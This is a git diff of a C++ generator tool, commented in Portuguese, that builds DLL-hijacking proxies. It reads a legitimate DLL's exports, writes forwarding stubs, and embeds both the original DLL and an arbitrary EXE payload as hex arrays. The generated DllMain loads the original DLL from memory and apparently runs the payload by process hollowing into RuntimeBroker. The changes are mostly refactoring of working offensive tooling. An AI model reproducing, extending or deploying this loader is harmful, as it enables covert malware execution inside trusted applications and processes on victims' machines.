@@ -65,8 +65,7 @@ RawFile GetFileContent(const char* lpFilePath)
 WORD fileType;
 vector<string> names;
 
-const vector<string> explode(const string &s, const char &c)
-{
+const vector<string> explode(const string &s, const char &c) {
     string buff{""};
     vector<string> v;
     for (auto n : s)
@@ -96,8 +95,7 @@ bool getFileContent(const string &path, vector<unsigned char> &buffer) {
     return false;
 }
 
-bool getImageFileHeaders(string fileName, IMAGE_NT_HEADERS &headers)
-{
+bool getImageFileHeaders(string fileName, IMAGE_NT_HEADERS &headers) {
     std::wstring wFileName = std::wstring(fileName.begin(), fileName.end());
     HANDLE fileHandle = CreateFileW(
         wFileName.c_str(),
@@ -149,8 +147,7 @@ bool getImageFileHeaders(string fileName, IMAGE_NT_HEADERS &headers)
     return true;
 }
 
-void listDLLFunctions(string sADllName, vector<string> &slListOfDllFunctions)
-{
+void listDLLFunctions(string sADllName, vector<string> &slListOfDllFunctions) {
     DWORD *dNameRVAs(0);
     _IMAGE_EXPORT_DIRECTORY *ImageExportDirectory;
     unsigned long cDirSize;
@@ -160,7 +157,6 @@ void listDLLFunctions(string sADllName, vector<string> &slListOfDllFunctions)
     if (MapAndLoad(sADllName.c_str(), NULL, &LoadedImage, TRUE, TRUE))
     {
         ImageExportDirectory = (_IMAGE_EXPORT_DIRECTORY *)ImageDirectoryEntryToData(LoadedImage.MappedAddress, false, IMAGE_DIRECTORY_ENTRY_EXPORT, &cDirSize);
-
         if (ImageExportDirectory != NULL)
         {
             dNameRVAs = (DWORD *)ImageRvaToVa(LoadedImage.FileHeader, LoadedImage.MappedAddress, ImageExportDirectory->AddressOfNames, NULL);
@@ -175,99 +171,107 @@ void listDLLFunctions(string sADllName, vector<string> &slListOfDllFunctions)
     }
 }
 
-void generateDEF(string name, vector<string> names)
-{
+void generateDEF(string name, vector<string> names) {
     std::fstream file;
     file.open(name + ".def", std::ios::out);
-    file << "LIBRARY " << name << endl;
-    file << "EXPORTS" << endl;
-
+    file << "LIBRARY " << name << std::endl;
+    file << "EXPORTS" << std::endl;
     for (int i = 0; i < names.size(); i++)
     {
-        file << "\t" << names[i] << "=Fake" << names[i] << " @" << i + 1 << endl;
+        file << "\t" << names[i] << "=Fake" << names[i] << " @" << i + 1 << std::endl;
     }
-
     file.close();
 }
 
-void generateMainCPP(string name, vector<string> names, string originalDllPath, RawFile exe)
-{
+bool generateMainCPP(string name, vector<string> names, string originalDllPath, RawFile exe) {
     // Ler o binário da DLL original
     vector<unsigned char> dllData;
     if (!getFileContent(originalDllPath, dllData)) {
-        cout << "[-] Erro ao ler o binario da DLL original para embutir." << endl;
-        return;
+        cout << "[-] Erro ao ler o binario da DLL original para embutir." << std::endl;
+        return false;
     }
-    cout << "[+] DLL original lida: " << dllData.size() << " bytes." << endl;
+    cout << "[+] DLL original lida: " << dllData.size() << " bytes." << std::endl;
     std::fstream file;
     file.open(name + ".cpp", std::ios::out);
-    // Inclusão do MemoryModule. 
-    // O usuário precisará ter MemoryModule.h e MemoryModule.c no projeto da DLL gerada.
-    file << "#include <windows.h>" << endl
-         << "#include <stdio.h>" << endl
-         << "#include <string>" << endl
-         << "#include <iostream>" << endl
-         << "#include <vector>" << endl
-         << "#include \"MemoryModule.h\"" << endl
-         << "#include \"process_hollowing.h\"" << endl
-         << endl;
-    // Escreve o array de bytes (Hex Dump)
-    file << "// Binario da DLL Original embutido" << endl;
-    file << "unsigned char originalDllData[" << dllData.size() << "] = {" << endl;
-    file << hex << setfill('0'); 
+    file << "#include <windows.h>" << std::endl;
+    file << "#include <stdio.h>" << std::endl;
+    file << "#include <string>" << std::endl;
+    file << "#include <iostream>" << std::endl;
+    file << "#include <vector>" << std::endl;
+    file << "#include \"MemoryModule.h\"" << std::endl;
+    file << "#include \"process_hollowing.h\"" << std::endl;
+    file << "#include \"dll_binary.h\"" << std::endl;
+    file << "#include \"exe_binary.h\"" << std::endl;
+    file << std::endl;
+
+
+    //dll_binary.h
+    std::fstream dllBinaryFile;
+    dllBinaryFile.open("dll_binary.h", std::ios::out);
+    dllBinaryFile << "unsigned char originalDllData[" << dllData.size() << "] = {";
+    dllBinaryFile << hex << setfill('0'); 
     for (size_t i = 0; i < dllData.size(); ++i) {
-        file << "0x" << setw(2) << (int)dllData[i];
-        if (i != dllData.size() - 1) file << ",";
-        if ((i + 1) % 16 == 0) file << endl;
+        dllBinaryFile << "0x" << setw(2) << (int)dllData[i];
+        if (i != dllData.size() - 1) dllBinaryFile << ",";
     }
-    file << dec; // Volta para decimal
-    file << "};" << endl << endl;
+    dllBinaryFile << dec;
+    dllBinaryFile << "};";
+    dllBinaryFile.close();
+
+
+
+
+
     file << "struct " << name << "_dll { \n"
-         << "\tHMEMORYMODULE dll;\n"; // Mudança de HMODULE para HMEMORYMODULE
+         << "\tHMEMORYMODULE dll;\n";
     for (int i = 0; i < names.size(); i++)
     {
         file << "\tFARPROC Orignal" << names[i] << ";\n";
     }
     file << "} " << name << ";\n\n";
     // Generate Exports
-    if (fileType == IMAGE_FILE_MACHINE_AMD64) // 64bit
-    {
-        file << "extern \"C\"" << endl
-             << "{" << endl;
+    if (fileType == IMAGE_FILE_MACHINE_AMD64) {
+        file << "extern \"C\"" << std::endl
+             << "{" << std::endl;
         for (int i = 0; i < names.size(); i++)
         {
             file << "\t__attribute__((naked)) void Fake" << names[i] << "() { asm volatile (\"jmp *%0\" : : \"m\" (" << name << ".Orignal" << names[i] << ")); }\n";
         }
-        file << "}" << endl;
-    }
-    else
-    { //x86
+        file << "}" << std::endl;
+    } else {
         for (int i = 0; i < names.size(); i++)
         {
             file << "__declspec(naked) void Fake" << names[i] << "() { _asm { jmp[" << name << ".Orignal" << names[i] << "] } }\n";
         }
     }
     file << "\n";
+
+
+    //exe_binary.h
     if (exe.data != nullptr) {
+        std::fstream exeBinaryFile;
+        exeBinaryFile.open("exe_binary.h", std::ios::out);
         cout << "Exe lido com sucesso! Tamanho: " << exe.size << " bytes.\n";
         unsigned char* pBuffer = (unsigned char*) exe.data;
-        cout << "[*] Escrevendo " << exe.size << " bytes ...\n";
-        file << "size_t payloadSize = " << exe.size << ";";
-        file << "unsigned char rawData[" << exe.size << "] = {\n";
+        exeBinaryFile << "size_t payloadSize = " << exe.size << ";\n";
+        exeBinaryFile << "unsigned char rawData[" << exe.size << "] = {";
         for (DWORD i = 0; i < exe.size; i++) {
-            file << "0x" << std::uppercase << std::hex << std::setw(2) << std::setfill('0') << (int)pBuffer[i];
+            exeBinaryFile << "0x" << std::uppercase << std::hex << std::setw(2) << std::setfill('0') << (int)pBuffer[i];
             if (i < exe.size - 1) {
-                file << ",";
-            }
-            if ((i + 1) % 16 == 0) {
-                file << "\n    ";
+                exeBinaryFile << ",";
             }
         }
-        file << "};\n";
+        exeBinaryFile << "};";
         HeapFree(GetProcessHeap(), 0, exe.data);
+        exeBinaryFile.close();
     } else {
         printf("Falha ao ler o arquivo.\n");
+        return false;
     }
+
+
+
+
     file << "\n";
     //incluir GetRuntimeBrokerPath
     file << "std::vector<unsigned char> GetRuntimeBrokerPath() {\n";
@@ -284,7 +288,7 @@ void generateMainCPP(string name, vector<string> names, string originalDllPath, 
     file << "}\n";
     file << "\n";
     // DllMain Modificado para carregar da memória
-    file << "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {" << endl;
+    file << "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {" << std::endl;
     file << "\tswitch (ul_reason_for_call)" << std::endl;
     file << "\t{" << std::endl;
     file << "\tcase DLL_PROCESS_ATTACH:" << std::endl;
@@ -360,26 +364,27 @@ void generateMainCPP(string name, vector<string> names, string originalDllPath, 
     file << "\treturn TRUE;" << std::endl;
     file << "}" << std::endl;
     file.close();
+    return true;
 }
 
 void generateASM(string name)
 {
     std::fstream file;
     file.open(name + ".asm", std::ios::out);
-    file << ".data" << endl;
-    file << "extern PA : qword" << endl;
-    file << ".code" << endl;
-    file << "RunASM proc" << endl;
-    file << "jmp qword ptr [PA]" << endl;
-    file << "RunASM endp" << endl;
-    file << "end" << endl;
+    file << ".data" << std::endl;
+    file << "extern PA : qword" << std::endl;
+    file << ".code" << std::endl;
+    file << "RunASM proc" << std::endl;
+    file << "jmp qword ptr [PA]" << std::endl;
+    file << "RunASM endp" << std::endl;
+    file << "end" << std::endl;
     file.close();
 }
 
 int main(int argc, char *argv[])
 {
     if (argc < 3) {
-        cout << "Usage: generator.exe <path_to_dll> <path_to_exe>" << endl;
+        cout << "Usage: generator.exe <path_to_dll> <path_to_exe>" << std::endl;
         return 1;
     }
     std::vector<std::string> args(argv, argv + argc);
@@ -389,7 +394,7 @@ int main(int argc, char *argv[])
         fileType = headers.FileHeader.Machine;
     }
     else {
-        cout << "Error reading PE headers." << endl;
+        cout << "Error reading PE headers." << std::endl;
         return 1;
     }
     // Get filename
@@ -401,10 +406,12 @@ int main(int argc, char *argv[])
     // Create Def File e CPP com binário embutido
     generateDEF(fileName, names);
     RawFile exe = GetFileContent(args[2].c_str());
-    generateMainCPP(fileName, names, args[1], exe); // Passamos o caminho completo agora
+    if (!generateMainCPP(fileName, names, args[1], exe)) {
+        return 1;
+    }
     if (fileType == IMAGE_FILE_MACHINE_AMD64) {
         generateASM(fileName);
     }
-    cout << "[+] Codigo gerado com sucesso!" << endl;
+    cout << "[+] Codigo gerado com sucesso!" << std::endl;
     return 0;
 }
